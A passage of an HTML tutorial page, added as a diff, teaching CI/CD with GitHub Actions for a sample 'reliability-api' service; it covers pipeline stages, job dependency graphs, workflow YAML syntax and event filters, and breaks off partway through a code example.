@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Module 09 · CI/CD with GitHub Actions — DevOps Notes</title>
+<link rel="stylesheet" href="assets/style.css">
+<script src="assets/notes.js"></script>
+<style>
+  /* page-local helpers for the two widgets (theme tokens only) */
+  .sim-table td.st-run { color: var(--ok); font-weight: 600; }
+  .sim-table td.st-skip { color: var(--muted); font-weight: 600; }
+  .sim-table td.st-fail { color: var(--bad); font-weight: 600; }
+  .sim-table td.st-none { color: var(--warn); font-weight: 600; }
+</style>
+</head>
+<body>
+<div class="topbar">
+  <a class="brand" href="index.html">DevOps Notes</a>
+  <span class="crumb">Module 09 · CI/CD with GitHub Actions</span>
+  <span class="spacer"></span>
+  <label class="pill"><input type="checkbox" data-done-key="09"> Done</label>
+  <button class="btn" onclick="toggleTheme()" aria-label="Toggle theme">◐</button>
+</div>
+<div class="layout">
+  <nav class="toc"><h4>On this page</h4><ol></ol></nav>
+  <main><article class="content">
+    <h1>Module 09 · CI/CD with GitHub Actions</h1>
+    <p class="lede">Up to now every build, test and deploy of <code>reliability-api</code> happened because <em>you</em> typed commands. This module moves that work into an automated, repeatable pipeline: every pull request is linted, unit-tested, built into an image, smoke-tested, scanned, deployed into a throw-away kind cluster and probed on <code>/ready</code> — and only a commit on <code>main</code> that passes all of that is published to GHCR as <code>ghcr.io/&lt;you&gt;/reliability-api:&lt;git-sha&gt;</code>. You will learn the GitHub Actions execution model well enough to read any workflow, predict what runs, keep it secure (least-privilege tokens, SHA-pinned actions), and diagnose a red pipeline from its logs.</p>
+    <div class="meta"><span class="pill accent">Prereq: Modules 02, 06 (Docker, kind, Helm)</span><span class="pill">≈ 4 h study + 4 h lab</span><span class="verified">✓ Checked against official docs, Oct 2026</span></div>
+
+    <h2>Learning objectives</h2>
+    <ul>
+      <li>Explain the difference between continuous integration, continuous delivery and continuous deployment, and say which one this project implements and why.</li>
+      <li>Name and relate the GitHub Actions building blocks: workflow, event, job, step, action, runner — and draw the <code>needs</code> graph of a workflow.</li>
+      <li>Read and write workflow YAML: <code>on</code> (push / pull_request / workflow_dispatch), <code>jobs</code>, <code>runs-on</code>, <code>steps</code> with <code>uses</code>/<code>run</code>/<code>with</code>/<code>env</code>, <code>if</code>, <code>needs</code>, job <code>outputs</code>, <code>strategy.matrix</code>, <code>concurrency</code>.</li>
+      <li>Use contexts and expressions correctly and avoid script injection.</li>
+      <li>Choose between secrets, configuration variables and env; restrict <code>GITHUB_TOKEN</code> with <code>permissions:</code>; pin third-party actions to full commit SHAs.</li>
+      <li>Speed pipelines up with dependency caching and Docker layer caching; move files between jobs with artifacts.</li>
+      <li>Build, scan and push the <code>reliability-api</code> image to GHCR tagged with the git SHA.</li>
+      <li>Run an integration test against a real Kubernetes API using kind inside CI, and collect diagnostics when it fails.</li>
+      <li>Gate merges with required status checks and gate deployments with environments and required reviewers; know where OIDC fits (Module 11).</li>
+    </ul>
+
+    <!-- ============================================================ -->
+    <h2>CI vs continuous delivery vs continuous deployment</h2>
+    <p><strong>Definition.</strong> <em>Continuous integration (CI)</em> is the practice of merging small changes into the shared main branch frequently, with every change automatically built and tested so that integration problems surface within minutes, not at release time. <em>Continuous delivery</em> extends CI so that every change that passes the pipeline produces a <em>deployable artifact</em> (for us: an immutable container image) and could be released at any time — but a human decides <em>when</em>. <em>Continuous deployment</em> removes that last human decision: every change that passes all automated checks goes to production automatically.</p>
+    <p><strong>Problem it solves.</strong> Without CI, each developer's branch drifts away from <code>main</code>; when branches are finally merged the conflicts and broken assumptions pile up ("integration hell"). Without delivery automation, releasing is a rare, manual, error-prone ceremony. The deeper reliability point: a pipeline turns "it works on my machine" into "it worked on a clean machine, from this exact commit, with this exact log" — evidence instead of belief.</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 840 300" role="img" aria-label="Three lanes comparing continuous integration, continuous delivery and continuous deployment">
+        <defs><marker id="m91" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <!-- lane 1 -->
+        <text x="12" y="52" class="t-bold">Continuous</text><text x="12" y="70" class="t-bold">Integration</text>
+        <rect x="160" y="34" width="120" height="44" rx="8" class="box"/><text x="220" y="61" text-anchor="middle">small commits</text>
+        <rect x="310" y="34" width="130" height="44" rx="8" class="box2"/><text x="375" y="61" text-anchor="middle">build + test</text>
+        <rect x="470" y="34" width="150" height="44" rx="8" class="box" stroke-dasharray="5 4"/><text x="545" y="61" text-anchor="middle" class="t-muted">artifact optional</text>
+        <text x="650" y="61" class="t-muted">release = manual project</text>
+        <path d="M280 56 H306" class="line" marker-end="url(#m91)"/><path d="M440 56 H466" class="line dash" marker-end="url(#m91)"/>
+        <!-- lane 2 -->
+        <text x="12" y="142" class="t-bold">Continuous</text><text x="12" y="160" class="t-bold">Delivery</text>
+        <rect x="160" y="124" width="120" height="44" rx="8" class="box"/><text x="220" y="151" text-anchor="middle">small commits</text>
+        <rect x="310" y="124" width="130" height="44" rx="8" class="box2"/><text x="375" y="151" text-anchor="middle">build + test</text>
+        <rect x="470" y="124" width="150" height="44" rx="8" class="box4"/><text x="545" y="151" text-anchor="middle">deployable image</text>
+        <polygon points="680,124 712,146 680,168 648,146" class="box3"/><text x="680" y="150" text-anchor="middle" class="t-bold">✋</text>
+        <text x="680" y="188" text-anchor="middle" class="t-muted">human approves</text>
+        <rect x="734" y="124" width="96" height="44" rx="8" class="box"/><text x="782" y="151" text-anchor="middle">production</text>
+        <path d="M280 146 H306" class="line" marker-end="url(#m91)"/><path d="M440 146 H466" class="line" marker-end="url(#m91)"/><path d="M620 146 H644" class="line" marker-end="url(#m91)"/><path d="M712 146 H730" class="line" marker-end="url(#m91)"/>
+        <!-- lane 3 -->
+        <text x="12" y="232" class="t-bold">Continuous</text><text x="12" y="250" class="t-bold">Deployment</text>
+        <rect x="160" y="214" width="120" height="44" rx="8" class="box"/><text x="220" y="241" text-anchor="middle">small commits</text>
+        <rect x="310" y="214" width="130" height="44" rx="8" class="box2"/><text x="375" y="241" text-anchor="middle">build + test</text>
+        <rect x="470" y="214" width="150" height="44" rx="8" class="box4"/><text x="545" y="241" text-anchor="middle">deployable image</text>
+        <circle cx="680" cy="236" r="18" class="box4"/><text x="680" y="241" text-anchor="middle" class="t-bold">auto</text>
+        <text x="680" y="276" text-anchor="middle" class="t-muted">checks are the gate</text>
+        <rect x="734" y="214" width="96" height="44" rx="8" class="box"/><text x="782" y="241" text-anchor="middle">production</text>
+        <path d="M280 236 H306" class="line" marker-end="url(#m91)"/><path d="M440 236 H466" class="line" marker-end="url(#m91)"/><path d="M620 236 H658" class="line" marker-end="url(#m91)"/><path d="M698 236 H730" class="line" marker-end="url(#m91)"/>
+      </svg>
+      <figcaption>The three practices differ only in how far automation goes and where the human decision sits. This module builds CI + delivery for reliability-api: every main commit yields a tested image; deploying it stays a deliberate step (gated environment).</figcaption>
+    </figure>
+
+    <h3>Which one does reliability-api use, and why?</h3>
+    <p>The study guide is explicit: <em>"Avoid automatically deploying every unreviewed change to a public environment in the initial project."</em> So we implement <strong>CI on every pull request</strong> and <strong>continuous delivery on main</strong>: a green <code>main</code> commit publishes an immutable image to GHCR. Deploying that image to a real cluster (GKE in Module 11) will be a separate job behind an <em>environment</em> with a required reviewer — continuous delivery, not continuous deployment.</p>
+    <div class="table-wrap"><table>
+      <tr><th>Practice</th><th>What is automated</th><th>Human decision</th><th>Prerequisite confidence</th></tr>
+      <tr><td>CI</td><td>build + tests on every change</td><td>when and how to release</td><td>tests catch regressions</td></tr>
+      <tr><td>Continuous delivery</td><td>CI + produce a release-ready artifact</td><td>when to deploy</td><td>artifact is the thing you will deploy (no rebuild later)</td></tr>
+      <tr><td>Continuous deployment</td><td>everything through production</td><td>none per change</td><td>strong tests, monitoring, automatic rollback, SLO alerting (Module 07)</td></tr>
+    </table></div>
+
+    <h3>Failure cases &amp; trade-offs</h3>
+    <ul>
+      <li><strong>"CI theatre":</strong> a pipeline that is always green because it tests nothing meaningful. Symptom: production bugs that a 3-line test would have caught. Fix: every bug that escapes gets a test; integration test probes real behaviour (<code>/ready</code> through a Service), not just "container started".</li>
+      <li><strong>Rebuilding at release time:</strong> if the image deployed to prod is rebuilt from source later, you deploy something that was never tested. Delivery means <em>build once, promote the same digest</em>.</li>
+      <li><strong>Slow pipelines</strong> erode CI: people batch changes to avoid waiting. Target a PR pipeline in the low minutes; use caching, parallel jobs and fail-fast (covered below).</li>
+      <li><strong>Trade-off:</strong> continuous deployment maximises speed but requires mature observability and rollback; for a learning project the cost of a bad auto-deploy (and possibly a cloud bill) outweighs the speed.</li>
+    </ul>
+    <details class="q"><summary>Self-check: your pipeline builds and tests every PR, and a release engineer rebuilds the image from the tag once a month. Is that continuous delivery?</summary><div class="a">No — it is CI. Continuous delivery requires that every passing change already produces the deployable artifact; rebuilding at release time means the released bits were never the tested bits.</div></details>
+
+    <!-- ============================================================ -->
+    <h2>The pipeline stages for reliability-api</h2>
+    <p>The study guide's deployment pipeline is: commit/PR → lint &amp; unit tests → build image → scan → push → deploy to test cluster → smoke/integration tests → all required checks pass? → mark deployable. We implement it with one important re-ordering: <strong>push to the registry comes last</strong>, after the image has been scanned and integration-tested, and only for <code>main</code>. Untested images never reach GHCR.</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 860 270" role="img" aria-label="Pipeline stages from commit to published image with typical time cost per stage">
+        <defs><marker id="m92" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="40" width="96" height="60" rx="8" class="box"/><text x="58" y="66" text-anchor="middle" class="t-bold">commit</text><text x="58" y="84" text-anchor="middle" class="t-muted">push / PR</text>
+        <rect x="126" y="40" width="108" height="60" rx="8" class="box2"/><text x="180" y="66" text-anchor="middle" class="t-bold">lint + test</text><text x="180" y="84" text-anchor="middle" class="t-muted">pytest, ruff</text>
+        <rect x="254" y="40" width="108" height="60" rx="8" class="box2"/><text x="308" y="66" text-anchor="middle" class="t-bold">build</text><text x="308" y="84" text-anchor="middle" class="t-muted">+ smoke run</text>
+        <rect x="382" y="40" width="108" height="60" rx="8" class="box2"/><text x="436" y="66" text-anchor="middle" class="t-bold">scan</text><text x="436" y="84" text-anchor="middle" class="t-muted">CVEs in image</text>
+        <rect x="510" y="40" width="118" height="60" rx="8" class="box2"/><text x="569" y="66" text-anchor="middle" class="t-bold">kind deploy</text><text x="569" y="84" text-anchor="middle" class="t-muted">rollout + /ready</text>
+        <rect x="648" y="40" width="96" height="60" rx="8" class="box4"/><text x="696" y="66" text-anchor="middle" class="t-bold">publish</text><text x="696" y="84" text-anchor="middle" class="t-muted">GHCR, main</text>
+        <rect x="764" y="40" width="86" height="60" rx="8" class="box3"/><text x="807" y="66" text-anchor="middle" class="t-bold">deploy</text><text x="807" y="84" text-anchor="middle" class="t-muted">gated (M11)</text>
+        <path d="M106 70 H122" class="line" marker-end="url(#m92)"/><path d="M234 70 H250" class="line" marker-end="url(#m92)"/><path d="M362 70 H378" class="line" marker-end="url(#m92)"/><path d="M490 70 H506" class="line" marker-end="url(#m92)"/><path d="M628 70 H644" class="line" marker-end="url(#m92)"/><path d="M744 70 H760" class="line dash" marker-end="url(#m92)"/>
+        <!-- cost bar -->
+        <text x="10" y="150" class="t-bold">Cheapest, fastest checks first →  most expensive, slowest checks last</text>
+        <rect x="126" y="166" width="108" height="14" class="box4"/><rect x="254" y="166" width="108" height="14" class="box2"/><rect x="382" y="166" width="108" height="14" class="box2"/><rect x="510" y="166" width="118" height="14" class="box3"/>
+        <text x="180" y="200" text-anchor="middle" class="t-muted">~seconds</text><text x="308" y="200" text-anchor="middle" class="t-muted">~1 min (cached)</text><text x="436" y="200" text-anchor="middle" class="t-muted">~1 min</text><text x="569" y="200" text-anchor="middle" class="t-muted">~2–4 min</text>
+        <text x="10" y="240" class="t-muted">Any red stage stops the chain: later jobs are skipped, so you get the earliest, cheapest failure signal. Timings are rough illustrations, not measurements.</text>
+      </svg>
+      <figcaption>Order stages by cost. A typo should fail in seconds in "lint + test", not after a 4-minute cluster boot.</figcaption>
+    </figure>
+
+    <p><strong>How it works step by step.</strong></p>
+    <ol>
+      <li><strong>Lint + unit tests</strong> run in a clean Python environment (no leftovers from your laptop). They prove the code is importable and the endpoints return the right shapes.</li>
+      <li><strong>Build</strong> produces the image from the Dockerfile of Module 02 and runs it once (<em>smoke test</em>: does the container start and answer <code>/health</code>?). This catches Dockerfile mistakes that unit tests cannot: missing files, wrong <code>CMD</code>, wrong port.</li>
+      <li><strong>Scan</strong> inspects the built image for known vulnerabilities in OS packages and Python libraries.</li>
+      <li><strong>kind integration</strong> deploys the exact image into a disposable Kubernetes cluster with the real manifests, waits for the rollout, and calls <code>/ready</code> through the Service. This catches manifest errors, probe misconfiguration and port mismatches.</li>
+      <li><strong>Publish</strong> (main only) pushes the already-tested image to GHCR, tagged with the full git SHA so the tag maps 1:1 to a commit.</li>
+    </ol>
+    <div class="callout tip"><span class="label">Rule of thumb</span>Every stage should answer one question with a clear yes/no, and its log should make the "no" obvious. The study guide's definition of done: <em>"a pull request cannot pass if its automated tests or image build fail, and the workflow's result can be understood from the log without guessing."</em></div>
+
+    <!-- ============================================================ -->
+    <h2>GitHub Actions concepts</h2>
+    <p>GitHub Actions is GitHub's built-in automation platform. Its vocabulary (from <em>Understanding GitHub Actions</em> on docs.github.com):</p>
+    <dl class="defs">
+      <dt>Workflow</dt><dd>A configurable automated process that runs one or more jobs, defined by a YAML file in <code>.github/workflows/</code>. Ours: <code>.github/workflows/ci.yml</code>.</dd>
+      <dt>Event</dt><dd>A specific activity in a repository that triggers a workflow run — a push, a pull request being opened, a manual dispatch, a schedule.</dd>
+      <dt>Workflow run</dt><dd>One execution of a workflow for one event. It has an ID, logs, artifacts and a result.</dd>
+      <dt>Job</dt><dd>A set of steps executed on the <em>same runner</em>. Jobs run <strong>in parallel by default</strong>; <code>needs</code> creates dependencies.</dd>
+      <dt>Step</dt><dd>One shell script (<code>run:</code>) or one action (<code>uses:</code>). Steps in a job run in order and share the runner's filesystem.</dd>
+      <dt>Action</dt><dd>A reusable, packaged unit of work (JavaScript, Docker or composite), e.g. <code>actions/checkout</code>. You reference it by <code>owner/repo@ref</code>.</dd>
+      <dt>Runner</dt><dd>A server that executes one job at a time. GitHub-hosted runners are fresh virtual machines (Ubuntu, Windows, macOS); self-hosted runners are machines you manage.</dd>
+    </dl>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 860 340" role="img" aria-label="Nesting of event, workflow run, jobs, runners and steps">
+        <defs><marker id="m93" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="20" width="150" height="60" rx="8" class="box3"/><text x="85" y="46" text-anchor="middle" class="t-bold">event</text><text x="85" y="66" text-anchor="middle" class="t-mono">pull_request</text>
+        <rect x="10" y="120" width="150" height="70" rx="8" class="box"/><text x="85" y="146" text-anchor="middle" class="t-bold">workflow file</text><text x="85" y="166" text-anchor="middle" class="t-mono">ci.yml</text><text x="85" y="182" text-anchor="middle" class="t-muted">on: matches event?</text>
+        <path d="M85 80 V116" class="line" marker-end="url(#m93)"/>
+        <path d="M160 155 H196" class="line" marker-end="url(#m93)"/>
+        <rect x="200" y="14" width="650" height="314" rx="12" class="zone"/>
+        <text x="214" y="36" class="t-bold">workflow run #142</text><text x="360" y="36" class="t-muted">(GitHub schedules jobs; each job gets its own fresh runner VM)</text>
+        <!-- runner 1 -->
+        <rect x="218" y="52" width="300" height="262" rx="10" class="box2"/>
+        <text x="232" y="74" class="t-bold">job: test</text><text x="330" y="74" class="t-muted">runner VM A (ubuntu)</text>
+        <rect x="236" y="88" width="264" height="32" rx="6" class="box"/><text x="248" y="109" class="t-mono">step 1  uses: actions/checkout</text>
+        <rect x="236" y="128" width="264" height="32" rx="6" class="box"/><text x="248" y="149" class="t-mono">step 2  uses: actions/setup-python</text>
+        <rect x="236" y="168" width="264" height="32" rx="6" class="box"/><text x="248" y="189" class="t-mono">step 3  run: pip install …</text>
+        <rect x="236" y="208" width="264" height="32" rx="6" class="box"/><text x="248" y="229" class="t-mono">step 4  run: python -m pytest</text>
+        <text x="236" y="266" class="t-muted">steps run in order, share the</text><text x="236" y="282" class="t-muted">workspace dir and env of this VM</text>
+        <!-- runner 2 -->
+        <rect x="536" y="52" width="298" height="262" rx="10" class="box2"/>
+        <text x="550" y="74" class="t-bold">job: build</text><text x="650" y="74" class="t-muted">runner VM B</text>
+        <rect x="554" y="88" width="262" height="32" rx="6" class="box"/><text x="566" y="109" class="t-mono">uses: actions/checkout</text>
+        <rect x="554" y="128" width="262" height="32" rx="6" class="box"/><text x="566" y="149" class="t-mono">uses: docker/build-push-action</text>
+        <rect x="554" y="168" width="262" height="32" rx="6" class="box"/><text x="566" y="189" class="t-mono">run: docker run … smoke</text>
+        <text x="554" y="236" class="t-muted">needs: test → starts only after</text><text x="554" y="252" class="t-muted">job "test" succeeded. Nothing on</text><text x="554" y="268" class="t-muted">VM A is visible here — pass data</text><text x="554" y="284" class="t-muted">via outputs, artifacts or registry.</text>
+      </svg>
+      <figcaption>An event selects workflow files whose <code>on:</code> matches; each matching file becomes a run; each job of the run gets its own clean runner; steps inside a job share that runner.</figcaption>
+    </figure>
+
+    <h3>Consequences you must internalise</h3>
+    <ul>
+      <li><strong>Jobs are isolated machines.</strong> A file written in job <code>test</code> does not exist in job <code>build</code>. This is why our pipeline hands the built image to later jobs as an <em>artifact</em> (a tarball), and why every job starts with <code>actions/checkout</code>.</li>
+      <li><strong>Steps share state</strong> (files, installed tools, <code>$GITHUB_ENV</code> exports). A failing step stops the remaining steps of the job unless they have a status function in <code>if:</code>.</li>
+      <li><strong>Runner = fresh VM per job</strong> for GitHub-hosted runners, so no hidden state from previous runs — the main reason CI results are trustworthy. Self-hosted runners do <em>not</em> give this guarantee; GitHub's security guide says they should "almost never be used for public repositories".</li>
+    </ul>
+
+    <h3>The needs graph (job DAG)</h3>
+    <p>Jobs form a directed acyclic graph through <code>needs:</code>. A job with no <code>needs</code> starts immediately. A job with <code>needs: [a, b]</code> waits for both. If a needed job fails (or is skipped), dependent jobs are <strong>skipped by default</strong> unless their <code>if:</code> uses a status function such as <code>always()</code> or <code>!cancelled()</code>.</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 860 300" role="img" aria-label="Job dependency graph of the reliability-api CI workflow">
+        <defs><marker id="m94" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="40" width="150" height="54" rx="8" class="box2"/><text x="85" y="63" text-anchor="middle" class="t-bold">test (py3.12)</text><text x="85" y="81" text-anchor="middle" class="t-muted">matrix leg</text>
+        <rect x="10" y="150" width="150" height="54" rx="8" class="box2"/><text x="85" y="173" text-anchor="middle" class="t-bold">test (py3.13)</text><text x="85" y="191" text-anchor="middle" class="t-muted">matrix leg</text>
+        <rect x="210" y="95" width="130" height="54" rx="8" class="box2"/><text x="275" y="118" text-anchor="middle" class="t-bold">build</text><text x="275" y="136" text-anchor="middle" class="t-muted">needs: test</text>
+        <rect x="390" y="95" width="130" height="54" rx="8" class="box2"/><text x="455" y="118" text-anchor="middle" class="t-bold">scan</text><text x="455" y="136" text-anchor="middle" class="t-muted">needs: build</text>
+        <rect x="570" y="95" width="140" height="54" rx="8" class="box2"/><text x="640" y="118" text-anchor="middle" class="t-bold">kind-integration</text><text x="640" y="136" text-anchor="middle" class="t-muted">needs: build, scan</text>
+        <rect x="740" y="95" width="110" height="54" rx="8" class="box4"/><text x="795" y="118" text-anchor="middle" class="t-bold">publish</text><text x="795" y="136" text-anchor="middle" class="t-muted">if: main push</text>
+        <path d="M160 67 C185 67 185 112 206 115" class="line" marker-end="url(#m94)"/>
+        <path d="M160 177 C185 177 185 132 206 129" class="line" marker-end="url(#m94)"/>
+        <path d="M340 122 H386" class="line" marker-end="url(#m94)"/>
+        <path d="M520 122 H566" class="line" marker-end="url(#m94)"/>
+        <path d="M710 122 H736" class="line" marker-end="url(#m94)"/>
+        <path d="M275 149 C275 230 640 230 640 153" class="line dash accent" marker-end="url(#m94)"/>
+        <text x="458" y="246" text-anchor="middle" class="t-muted">needs.build.outputs.image (string) flows to every downstream job that lists build in needs</text>
+        <path d="M275 95 C275 30 795 30 795 91" class="line dash accent" marker-end="url(#m94)"/>
+        <text x="540" y="28" text-anchor="middle" class="t-muted">publish also needs build (for the image output)</text>
+        <text x="10" y="284" class="t-muted">Both matrix legs must succeed for build to start. A red leg → build, scan, kind-integration, publish all show "skipped".</text>
+      </svg>
+      <figcaption>The DAG of the complete <code>ci.yml</code> shown later. Solid arrows are <code>needs</code> edges; dashed arrows show job outputs travelling through <code>needs</code>.</figcaption>
+    </figure>
+    <div class="callout note"><span class="label">Trade-off: chain vs fan-out</span><code>scan</code> and <code>kind-integration</code> are independent — both only need the built image. Running them in parallel (<code>needs: build</code> for both) shortens wall-clock time. We chain them deliberately (<code>kind-integration</code> needs <code>scan</code>) so that a vulnerable image never even gets deployed into the test cluster, and so the run visualizer below has a simple line to follow. In your project, measure both and choose.</div>
+    <details class="q"><summary>Self-check: job C has <code>needs: [A, B]</code>. A succeeds, B fails. What happens to C, and how could you make a "notify" job run anyway?</summary><div class="a">C is skipped. A notify job can use <code>if: ${{ !cancelled() }}</code> (or <code>always()</code>) with <code>needs: [A, B]</code>; it can inspect <code>needs.B.result</code> (<code>success</code>, <code>failure</code>, <code>cancelled</code> or <code>skipped</code>) to decide what to report.</div></details>
+
+    <!-- ============================================================ -->
+    <h2>Workflow YAML anatomy</h2>
+    <p>A workflow file is ordinary YAML with a fixed schema. Read it top-down as: <em>name → when (on) → defaults for everything (permissions, env, concurrency) → jobs → per job: where (runs-on), order (needs), condition (if), what (steps)</em>.</p>
+<pre data-title="Annotated skeleton (not the final file)"><code><span class="k">name</span>: ci                             <span class="c"># shown in the Actions tab and in status checks</span>
+
+<span class="k">on</span>:                                   <span class="c"># WHEN: which events start a run</span>
+  <span class="k">push</span>:
+    <span class="k">branches</span>: [main]                  <span class="c"># only pushes to main</span>
+  <span class="k">pull_request</span>:
+    <span class="k">branches</span>: [main]                  <span class="c"># only PRs whose BASE branch is main</span>
+  <span class="k">workflow_dispatch</span>:                  <span class="c"># "Run workflow" button / gh workflow run</span>
+
+<span class="k">permissions</span>:                          <span class="c"># default GITHUB_TOKEN scopes for every job</span>
+  <span class="k">contents</span>: read
+
+<span class="k">concurrency</span>:                          <span class="c"># at most one active run per group</span>
+  <span class="k">group</span>: ${{ github.workflow }}-${{ github.ref }}
+  <span class="k">cancel-in-progress</span>: true
+
+<span class="k">env</span>:                                  <span class="c"># workflow-level env, visible in all steps</span>
+  <span class="k">APP_NAME</span>: reliability-api
+
+<span class="k">jobs</span>:
+  <span class="k">test</span>:                               <span class="c"># job id (used in needs / needs.&lt;id&gt;.outputs)</span>
+    <span class="k">runs-on</span>: ubuntu-latest             <span class="c"># WHERE: runner label</span>
+    <span class="k">timeout-minutes</span>: 10               <span class="c"># kill a hung job early</span>
+    <span class="k">steps</span>:
+      - <span class="k">uses</span>: actions/checkout@v7      <span class="c"># an action (pin to a SHA — see hardening)</span>
+      - <span class="k">name</span>: Unit tests
+        <span class="k">run</span>: python -m pytest -q       <span class="c"># a shell command (bash on Linux)</span>
+        <span class="k">env</span>:
+          <span class="k">LOG_LEVEL</span>: debug               <span class="c"># step-level env overrides job/workflow env</span>
+
+  <span class="k">build</span>:
+    <span class="k">needs</span>: test                       <span class="c"># ORDER: wait for test to succeed</span>
+    <span class="k">if</span>: github.event_name != 'schedule'   <span class="c"># CONDITION: skip the job when false</span>
+    <span class="k">runs-on</span>: ubuntu-latest
+    <span class="k">outputs</span>:                          <span class="c"># values other jobs may read</span>
+      <span class="k">image</span>: ${{ steps.meta.outputs.tags }}
+    <span class="k">steps</span>:
+      - <span class="k">id</span>: meta                       <span class="c"># id makes steps.meta.* addressable</span>
+        <span class="k">uses</span>: docker/metadata-action@v6
+        <span class="k">with</span>:                          <span class="c"># inputs for the action</span>
+          <span class="k">images</span>: ghcr.io/${{ github.repository_owner }}/reliability-api</code></pre>
+
+    <h3><code>on:</code> — events and filters</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Event</th><th>When it fires</th><th><code>GITHUB_SHA</code> is…</th><th><code>GITHUB_REF</code> is…</th><th>Notes</th></tr>
+      <tr><td><code>push</code></td><td>commits/tags pushed</td><td>tip commit pushed to the ref</td><td>the updated ref, e.g. <code>refs/heads/main</code></td><td><code>branches</code>/<code>tags</code>/<code>paths</code> filters; path filters are not evaluated for tag pushes</td></tr>
+      <tr><td><code>pull_request</code></td><td>activity on a PR; by default only <code>opened</code>, <code>synchronize</code>, <code>reopened</code></td><td>the last <strong>merge commit</strong> of PR head into base</td><td><code>refs/pull/&lt;n&gt;/merge</code></td><td><code>branches</code> filter matches the <em>base</em> branch. From forks: no secrets except <code>GITHUB_TOKEN</code>, token is read-only</td></tr>
+      <tr><td><code>workflow_dispatch</code></td><td>manual trigger (UI, API, <code>gh workflow run</code>)</td><td>last commit on the chosen ref</td><td>the chosen branch/tag</td><td>the workflow file must exist on the default branch; can declare <code>inputs</code></td></tr>
+      <tr><td><code>schedule</code></td><td>cron</td><td>latest commit on default branch</td><td>default branch</td><td>shortest interval is every 5 minutes</td></tr>
+      <tr><td><code>pull_request_target</code></td><td>PR activity, but runs in the <em>base</em> repo context</td><td>last commit on default branch</td><td>default branch</td><td>has secrets + write token: never check out and run untrusted PR code in it</td></tr>
+    </table></div>
+    <p>Filters combine with AND: if you set both <code>branches</code> and <code>paths</code>, the workflow runs only when both match. You cannot use <code>branches</code> and <code>branches-ignore</code> together for the same event.</p>
+    <div class="callout warn"><span class="label">Required checks + path filters = stuck PR</span>If a workflow is skipped because of path filtering, branch filtering or a commit message, the checks associated with it stay <strong>"Pending"</strong> — and a required check that is pending blocks the merge forever. GitHub's guidance: do not use path or branch filtering to skip a workflow that is required. Instead let the workflow run and skip <em>jobs</em> with <code>if:</code>; a job skipped by a conditional reports <strong>"Success"</strong>. That is why our <code>ci.yml</code> has no <code>paths-ignore</code>, and gates <code>publish</code> with <code>if:</code>.</div>
+
+    <h3><code>jobs.&lt;id&gt;</code> keys you will use</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Key</th><th>Meaning</th><th>reliability-api use</th></tr>
+      <tr><td><code>runs-on</code></td><td>runner label(s) to pick a machine</td><td><code>ubuntu-latest</code> everywhere (kind needs Linux + Docker)</td></tr>
+      <tr><td><code>needs</code></td><td>job ids that must succeed first</td><td><code>build</code> needs <code>test</code>, etc.</td></tr>
+      <tr><td><code>if</code></td><td>expression; false → job is skipped</td><td>publish only on push to main</td></tr>
+      <tr><td><code>permissions</code></td><td>overrides workflow-level token scopes for this job</td><td>publish adds <code>packages: write</code></td></tr>
+      <tr><td><code>outputs</code></td><td>map of strings exported to dependent jobs</td><td>build exports <code>image</code></td></tr>
+      <tr><td><code>strategy.matrix</code></td><td>fan a job out over combinations</td><td>Python 3.12 and 3.13</td></tr>
+      <tr><td><code>timeout-minutes</code></td><td>cancel a job that runs too long</td><td>10–20 min per job</td></tr>
+      <tr><td><code>environment</code></td><td>deployment environment (protection rules, env secrets)</td><td>future <code>deploy-gke</code> job (Module 11)</td></tr>
+      <tr><td><code>env</code>, <code>defaults.run</code></td><td>job env vars; default shell / working directory</td><td>—</td></tr>
+    </table></div>
+
+    <h3>Steps: <code>uses</code> vs <code>run</code>, <code>with</code>, <code>env</code>, <code>id</code>, <code>if</code></h3>
+    <ul>
+      <li><code>uses: owner/repo@ref</code> runs an action; <code>with:</code> supplies its <em>inputs</em> (only inputs that action declares — check its README/<code>action.yml</code>).</li>
+      <li><code>run: |</code> runs a multi-line script in the default shell (<code>bash</code> on Ubuntu runners). A non-zero exit code fails the step.</li>
+      <li><code>id:</code> names the step so later steps can read <code>steps.&lt;id&gt;.outputs.&lt;name&gt;</code>, <code>.outcome</code> and <code>.conclusion</code>.</li>
+      <li><code>env:</code> at step level overrides job level, which overrides workflow level. Entries in one <code>env</code> map cannot reference each other.</li>
+      <li><code>if:</code> at step level; default is <code>success()</code> — "all previous steps succeeded". Use <code>failure()</code> for diagnostics-on-failure steps and <code>!cancelled()</code> for "always unless the run was cancelled".</li>
+      <li><code>continue-on-error: true</code> lets the job continue after this step fails (use sparingly — it hides failures).</li>
+    </ul>
+
+    <h3>Passing data: step outputs, job outputs, <code>$GITHUB_ENV</code></h3>
+<pre data-title="Step output → job output → another job"><code><span class="k">jobs</span>:
+  <span class="k">build</span>:
+    <span class="k">runs-on</span>: ubuntu-latest
+    <span class="k">outputs</span>:
+      <span class="k">short_sha</span>: ${{ steps.vars.outputs.short_sha }}     <span class="c"># 2) promote step output to job output</span>
+    <span class="k">steps</span>:
+      - <span class="k">id</span>: vars
+        <span class="k">run</span>: echo "short_sha=${GITHUB_SHA::7}" &gt;&gt; "$GITHUB_OUTPUT"   <span class="c"># 1) write a step output</span>
+  <span class="k">report</span>:
+    <span class="k">needs</span>: build
+    <span class="k">runs-on</span>: ubuntu-latest
+    <span class="k">steps</span>:
